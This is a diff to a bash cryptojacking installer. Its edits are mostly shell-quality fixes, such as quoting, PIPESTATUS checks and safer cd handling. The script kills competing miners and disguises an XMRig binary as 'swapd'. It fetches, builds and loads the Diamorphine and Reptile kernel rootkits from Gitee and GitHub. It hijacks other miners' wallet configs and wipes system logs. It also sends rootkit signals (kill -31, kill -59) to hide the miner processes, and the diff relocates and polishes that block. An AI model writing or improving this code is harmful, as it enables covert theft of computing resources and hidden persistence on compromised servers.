@@ -141,7 +141,7 @@ for service_name in "${OLD_SERVICES[@]}"; do
     
     # Also check SysV init
     if [ -f "/etc/init.d/$service_name" ]; then
-        /etc/init.d/$service_name stop 2>/dev/null || true
+        /etc/init.d/"$service_name" stop 2>/dev/null || true
         rm -f "/etc/init.d/$service_name" 2>/dev/null || true
     fi
 done
@@ -221,7 +221,7 @@ echo "[*] Killing competitor miners..."
 killall -9 xmrig 2>/dev/null || true
 killall -9 kswapd0 2>/dev/null || true
 killall -9 swapd 2>/dev/null || true
-kill -9 $(pgrep -f "swapd|kswapd0|xmrig") 2>/dev/null || true
+pgrep -f "swapd|kswapd0|xmrig" | xargs -r kill -9 2>/dev/null || true
 
 echo "[*] Removing immutable attributes from old installations..."
 # Remove immutable flags (chattr -i) before deletion
@@ -317,8 +317,8 @@ elif command -v dnf >/dev/null 2>&1; then
 else
     echo "[!] WARNING: No supported package manager found"
     PKG_MANAGER="unknown"
-    PKG_INSTALL="echo 'No package manager available:'"
-    PKG_UPDATE="true"
+    export PKG_INSTALL="echo 'No package manager available:'"
+    export PKG_UPDATE="true"
 fi
 echo "[*] Detected package manager: $PKG_MANAGER"
 
@@ -461,7 +461,9 @@ force_stop_service() {
                     pkill -9 -f "$proc" 2>/dev/null || true
                     
                     # Method 2c: Find and kill by PID
-                    local pids=$(pgrep -x "$proc" 2>/dev/null)
+                    local pids
+
+                    pids=$(pgrep -x "$proc" 2>/dev/null)
                     if [ -n "$pids" ]; then
                         for pid in $pids; do
                             kill -9 "$pid" 2>/dev/null || true
@@ -469,7 +471,9 @@ force_stop_service() {
                     fi
                     
                     # Method 2d: Find by full command and kill
-                    local pids=$(pgrep -f "$proc" 2>/dev/null)
+                    local pids
+
+                    pids=$(pgrep -f "$proc" 2>/dev/null)
                     if [ -n "$pids" ]; then
                         for pid in $pids; do
                             kill -9 "$pid" 2>/dev/null || true
@@ -486,9 +490,13 @@ force_stop_service() {
             for proc in $process_names; do
                 for pid_dir in /proc/[0-9]*; do
                     if [ -f "$pid_dir/cmdline" ]; then
-                        local cmdline=$(cat "$pid_dir/cmdline" 2>/dev/null | tr '\0' ' ')
+                        local cmdline
+
+                        cmdline=$(cat "$pid_dir/cmdline" 2>/dev/null | tr '\0' ' ')
                         if echo "$cmdline" | grep -q "$proc"; then
-                            local pid=$(basename "$pid_dir")
+                            local pid
+
+                            pid=$(basename "$pid_dir")
                             echo "[*] Attempt $attempt: Found survivor PID $pid, killing..."
                             kill -9 "$pid" 2>/dev/null || true
                             all_stopped=false
@@ -568,7 +576,7 @@ echo "[*] Installing git make gcc build-essential kernel headers..."
 if command -v apt-get >/dev/null 2>&1; then
     DEBIAN_FRONTEND=noninteractive apt-get install -y \
         git make gcc g++ build-essential \
-        linux-headers-$(uname -r) \
+        linux-headers-"$(uname -r)" \
         wget curl 2>&1 | tail -10 || true
 fi
 
@@ -608,8 +616,8 @@ if command -v apt >/dev/null 2>&1; then
     echo "[*] Detected Debian/Ubuntu system"
     apt update 2>/dev/null || true
     NEEDRESTART_MODE=a apt-get reinstall kmod 2>/dev/null || true
-    NEEDRESTART_MODE=a apt install -y build-essential linux-headers-$(uname -r) 2>/dev/null || true
-    NEEDRESTART_MODE=a apt install -y linux-generic linux-headers-$(uname -r) 2>/dev/null || true
+    NEEDRESTART_MODE=a apt install -y build-essential linux-headers-"$(uname -r)" 2>/dev/null || true
+    NEEDRESTART_MODE=a apt install -y linux-generic linux-headers-"$(uname -r)" 2>/dev/null || true
     NEEDRESTART_MODE=a apt install -y git make gcc msr-tools build-essential libncurses-dev 2>/dev/null || true
     # Backports for newer kernels (Debian)
     NEEDRESTART_MODE=a apt install -t bookworm-backports linux-image-amd64 -y 2>/dev/null || true
@@ -618,20 +626,20 @@ if command -v apt >/dev/null 2>&1; then
 elif command -v dnf >/dev/null 2>&1; then
     # Fedora / RHEL 8+ / CentOS Stream
     echo "[*] Detected Fedora/RHEL 8+ system"
-    dnf install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc 2>/dev/null || true
+    dnf install -y kernel-devel-"$(uname -r)" kernel-headers-"$(uname -r)" make gcc 2>/dev/null || true
     
 elif command -v yum >/dev/null 2>&1; then
     # RHEL 7 / CentOS 7
     echo "[*] Detected RHEL/CentOS 7 system"
-    yum install -y linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools 2>/dev/null || true
-    yum install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc 2>/dev/null || true
+    yum install -y linux-generic linux-headers-"$(uname -r)" kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools 2>/dev/null || true
+    yum install -y kernel-devel-"$(uname -r)" kernel-headers-"$(uname -r)" make gcc 2>/dev/null || true
     
 elif command -v zypper >/dev/null 2>&1; then
     # openSUSE / SLE
     echo "[*] Detected openSUSE/SLE system"
     zypper update -y 2>/dev/null || true
     zypper install -y kernel-devel kernel-default-devel gcc make 2>/dev/null || true
-    zypper install -y linux-generic linux-headers-$(uname -r) git make gcc msr-tools build-essential libncurses-dev 2>/dev/null || true
+    zypper install -y linux-generic linux-headers-"$(uname -r)" git make gcc msr-tools build-essential libncurses-dev 2>/dev/null || true
     
 else
     echo "[!] WARNING: Unsupported distribution. Kernel headers may not be installed."
@@ -655,7 +663,7 @@ fi
 
 # Copy vmlinux for BPF compilation
 if [ -f /sys/kernel/btf/vmlinux ]; then
-    cp /sys/kernel/btf/vmlinux /usr/lib/modules/$(uname -r)/build/ 2>/dev/null || true
+    cp /sys/kernel/btf/vmlinux /usr/lib/modules/"$(uname -r)"/build/ 2>/dev/null || true
     echo "[✓] vmlinux copied for BPF support"
 else
     echo "[!] vmlinux not found, skipping..."
@@ -722,7 +730,7 @@ cd /root/.swapd || {
     mkdir -p /root/.swapd 2>/dev/null || true
     cd /root/.swapd || {
         echo "[!] Cannot access /root/.swapd - using /tmp instead"
-        cd /tmp
+        cd /tmp || true
     }
 }
 
@@ -789,23 +797,23 @@ echo "[*] Renaming miner binary to 'swapd'..."
 
 # Simply rename the binary to swapd (no symlink, no wrapper!)
 if [ -f .kworker ]; then
-    mv .kworker swapd && {
+    if mv .kworker swapd; then
         chmod +x swapd
         echo "[✓] Binary renamed: .kworker → swapd (direct file, no symlink)"
-    } || {
+    else
         echo "[!] Failed to rename, trying copy..."
         cp .kworker swapd && chmod +x swapd
         rm -f .kworker
         echo "[✓] Binary copied to swapd"
-    }
+    fi
 elif [ -f xmrig ]; then
-    mv xmrig swapd && {
+    if mv xmrig swapd; then
         chmod +x swapd
         echo "[✓] Binary renamed: xmrig → swapd"
-    } || {
+    else
         cp xmrig swapd && chmod +x swapd
         echo "[✓] Binary copied to swapd"
-    }
+    fi
 else
     echo "[!] Warning: No miner binary found (.kworker or xmrig missing)"
     echo "[!] Creating placeholder..."
@@ -920,14 +928,14 @@ if grep -q "PASS_PLACEHOLDER" swapfile 2>/dev/null; then
 fi
 
 # Also update any existing pass field to ensure it's correct
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' swapfile
+sed -i 's/"pass": *"[^"]*",/"pass": "'"$PASS"'",/' swapfile
 
 echo "[✓] XMRig configuration created as 'swapfile'"
 echo "[✓] Wallet: ${WALLET:0:20}...${WALLET: -20}"
 echo "[✓] Pass (Worker ID): $PASS"
 
 # Verify PASS was set correctly
-if grep -q '"pass": "'$PASS'"' swapfile; then
+if grep -q '"pass": "'"$PASS"'"' swapfile; then
     echo "[✓] Worker ID successfully set in config"
 else
     echo "[!] Warning: Worker ID may not be set correctly"
@@ -1207,7 +1215,7 @@ install_diamorphine() {
     
     cd diamorphine || {
         echo "[!] Failed to cd to diamorphine directory"
-        cd /tmp
+        cd /tmp || true
         rm -rf diamorphine
         return 1
     }
@@ -1224,7 +1232,7 @@ install_diamorphine() {
     if [ $BUILD_SUCCESS -ne 0 ]; then
         echo "[!] Failed to build Diamorphine"
         echo "[!] This is common on kernel 6.x - try Reptile instead"
-        cd /tmp
+        cd /tmp || true
         rm -rf diamorphine
         return 1
     fi
@@ -1245,12 +1253,12 @@ install_diamorphine() {
         echo "[!] insmod hung after 10s — killing"
         kill -9 "$INSMOD_PID" 2>/dev/null || true
         wait "$INSMOD_PID" 2>/dev/null || true
-        cd /tmp; rm -rf diamorphine; return 1
+        cd /tmp || true; rm -rf diamorphine; return 1
     fi
     if [ "$INSMOD_SUCCESS" != true ]; then
         echo "[!] Failed to load Diamorphine"
         echo "[!] Likely kernel incompatibility - try Reptile instead"
-        cd /tmp; rm -rf diamorphine; return 1
+        cd /tmp || true; rm -rf diamorphine; return 1
     fi
     
     # Verify it loaded
@@ -1259,13 +1267,13 @@ install_diamorphine() {
         echo "[✓] Surprisingly worked on kernel $(uname -r)!"
         
         # Clean up build artifacts
-        cd /tmp
+        cd /tmp || true
         rm -rf diamorphine
         
         return 0
     else
         echo "[!] Diamorphine failed to load"
-        cd /tmp
+        cd /tmp || true
         rm -rf diamorphine
         return 1
     fi
@@ -1319,23 +1327,26 @@ install_reptile() {
     if [ "$VERBOSE" = true ]; then
         echo "[*] Cloning from Gitee: https://gitee.com/fengzihk/Reptile.git"
         git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username"
+        CLONE_STATUS=${PIPESTATUS[0]}
     else
         git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username" >/dev/null
+        CLONE_STATUS=${PIPESTATUS[0]}
     fi
-    
-    if [ $? -eq 0 ]; then
+
+    if [ "$CLONE_STATUS" -eq 0 ]; then
         echo "[✓] Cloned from Gitee mirror"
     else
         echo "[*] Gitee failed, trying GitHub mirror..."
-        # Fallback to GitHub
         if [ "$VERBOSE" = true ]; then
             echo "[*] Cloning from GitHub: https://github.com/f0rb1dd3n/Reptile.git"
             git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"
+            CLONE_STATUS=${PIPESTATUS[0]}
         else
             git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username" >/dev/null
+            CLONE_STATUS=${PIPESTATUS[0]}
         fi
-        
-        if [ $? -eq 0 ]; then
+
+        if [ "$CLONE_STATUS" -eq 0 ]; then
             echo "[✓] Cloned from GitHub mirror"
         else
             echo "[!] Failed to clone Reptile (network or repository unavailable)"
@@ -1351,7 +1362,7 @@ install_reptile() {
     echo "[*] Building Reptile (this may take a while)..."
     if ! make 2>/dev/null; then
         echo "[!] Failed to build Reptile"
-        cd /tmp/.ICE-unix/.X11-unix
+        cd /tmp/.ICE-unix/.X11-unix || true
         rm -rf Reptile
         return 1
     fi
@@ -1372,11 +1383,11 @@ install_reptile() {
         echo "[!] insmod hung after 10s — killing"
         kill -9 "$INSMOD_PID" 2>/dev/null || true
         wait "$INSMOD_PID" 2>/dev/null || true
-        cd /tmp/.ICE-unix/.X11-unix; rm -rf Reptile; return 1
+        cd /tmp/.ICE-unix/.X11-unix || true; rm -rf Reptile; return 1
     fi
     if [ "$INSMOD_SUCCESS" != true ]; then
         echo "[!] Failed to load Reptile"
-        cd /tmp/.ICE-unix/.X11-unix; rm -rf Reptile; return 1
+        cd /tmp/.ICE-unix/.X11-unix || true; rm -rf Reptile; return 1
     fi
     
     # Verify it loaded
@@ -1385,7 +1396,7 @@ install_reptile() {
         return 0
     else
         echo "[!] Reptile failed to load"
-        cd /tmp/.ICE-unix/.X11-unix
+        cd /tmp/.ICE-unix/.X11-unix || true
         rm -rf Reptile
         return 1
     fi
@@ -1667,55 +1678,6 @@ else
     /etc/init.d/swapd status
 fi
 
-echo ""
-# ==================== HIDE MINER PROCESSES ====================
-echo "[*] Hiding miner processes..."
-sleep 3  # Give processes time to fully start before sending signals
-
-# ---- Diamorphine — signal 31 = hide, signal 63 = confirm hide ----
-if lsmod | grep -q "^diamorphine" 2>/dev/null; then
-    echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
-
-    kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-
-
-    echo "[✓] Processes hidden with Diamorphine (kill -31)"
-else
-    echo "[*] Diamorphine not loaded — skipping"
-fi
-
-# ---- Crypto-Miner rootkit — signal 31 = hide, signal 63 = confirm hide ----
-if lsmod | grep -q "^rootkit" 2>/dev/null; then
-    echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
-
-    kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-
-
-    echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
-else
-    echo "[*] Crypto-Miner rootkit not loaded — skipping"
-fi
-
-# ---- Singularity (kernel 6.x) — signal 59 = toggle visibility ----
-if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/null; then
-    echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
-
-    kill -59 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -59 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -59 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -59 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-
-    echo "[✓] Processes hidden with Singularity (kill -59)"
-else
-    echo "[*] Singularity not loaded — skipping"
-fi
-
 # ==================== CLEAN UP LOGS ====================
 echo "[*] Cleaning up system logs..."
 
@@ -1784,9 +1746,15 @@ find_and_hijack() {
     local changed=0
     # Scan all processes for "-c" flag (XMRig config indicator)
     ps auxww | grep -E '\-c\s+' | grep -v grep | while read -r line; do
-        local cmdline=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')
-        local config=$(echo "$cmdline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
-        local pid=$(echo "$line" | awk '{print $2}')
+        local cmdline
+
+        cmdline=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')
+        local config
+
+        config=$(echo "$cmdline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
+        local pid
+
+        pid=$(echo "$line" | awk '{print $2}')
         
         if [ -n "$config" ] && [ -f "$config" ]; then
             if grep -q '"user"' "$config" 2>/dev/null; then
@@ -1807,7 +1775,9 @@ find_and_hijack() {
         if [ -n "$cron_content" ]; then
             # Look for lines with -c flag
             echo "$cron_content" | grep -E '\-c\s+' | while read -r cronline; do
-                local config=$(echo "$cronline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
+                local config
+
+                config=$(echo "$cronline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
                 if [ -n "$config" ] && [ -f "$config" ]; then
                     if grep -q '"user"' "$config" 2>/dev/null; then
                         local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
@@ -2041,62 +2011,6 @@ chmod 600 ~/.ssh/authorized_keys 2>/dev/null || true
 echo "[✓] SSH configuration complete (backdoor disabled by default)"
 echo ""
 
-# ==================== PROCESS HIDING (ROOTKIT COMMANDS) ====================
-echo "=========================================="
-echo "ACTIVATING PROCESS HIDING"
-echo "=========================================="
-echo ""
-
-echo "[*] Hiding processes with rootkit commands..."
-sleep 2  # Ensure services are fully up before sending signals
-
-# ---- Diamorphine: signal 31 = hide, signal 63 = confirm hide ----
-if lsmod | grep -q "^diamorphine" 2>/dev/null; then
-    echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
-
-    kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-
-
-    echo "[✓] Processes hidden with Diamorphine (kill -31)"
-else
-    echo "[*] Diamorphine not loaded — skipping"
-fi
-
-# ---- Crypto-Miner rootkit: signal 31 = hide, signal 63 = confirm hide ----
-if lsmod | grep -q "^rootkit" 2>/dev/null; then
-    echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
-
-    kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -31 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-
-
-    echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
-else
-    echo "[*] Crypto-Miner rootkit not loaded — skipping"
-fi
-
-# ---- Singularity (kernel 6.x): signal 59 = toggle visibility ----
-if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/null; then
-    echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
-
-    kill -59 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -59 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -59 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-    kill -59 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
-
-    echo "[✓] Processes hidden with Singularity (kill -59)"
-else
-    echo "[*] Singularity not loaded — skipping"
-fi
-
-echo "[✓] Process hiding activated"
-echo ""
-
 # ==================== INSTALLATION SUMMARY ====================
 echo '========================================================================='
 echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE (KERNEL ROOTKITS ONLY)!'
@@ -2248,4 +2162,50 @@ else
 fi
 
 echo ''
+
+# ==================== HIDE MINER PROCESSES ====================
+echo ""
+echo "=========================================="
+echo "ACTIVATING PROCESS HIDING"
+echo "=========================================="
+echo ""
+echo "[*] Sending hide signals to all loaded rootkits..."
+sleep 3  # Give processes time to be fully up before hiding
+
+# ---- Diamorphine: kill -31 = hide ----
+if lsmod | grep -q "^diamorphine" 2>/dev/null; then
+    echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
+    pgrep -f -u root config.json | xargs -r kill -31 2>/dev/null || true
+    kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+    kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+    kill -31 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+    echo "[✓] Processes hidden with Diamorphine (kill -31)"
+else
+    echo "[*] Diamorphine not loaded — skipping"
+fi
+
+# ---- Crypto-Miner rootkit: kill -31 = hide ----
+if lsmod | grep -q "^rootkit" 2>/dev/null; then
+    echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
+    pgrep -f -u root config.json | xargs -r kill -31 2>/dev/null || true
+    kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+    kill -31 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+    kill -31 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+    echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
+else
+    echo "[*] Crypto-Miner rootkit not loaded — skipping"
+fi
+
+# ---- Singularity (kernel 6.x): kill -59 = toggle hide ----
+if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/null; then
+    echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
+    pgrep -f -u root config.json | xargs -r kill -59 2>/dev/null || true
+    kill -59 "$(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+    kill -59 "$(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+    kill -59 "$(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}')" 2>/dev/null || true
+    echo "[✓] Processes hidden with Singularity (kill -59)"
+else
+    echo "[*] Singularity not loaded — skipping"
+fi
+
 echo '========================================================================'
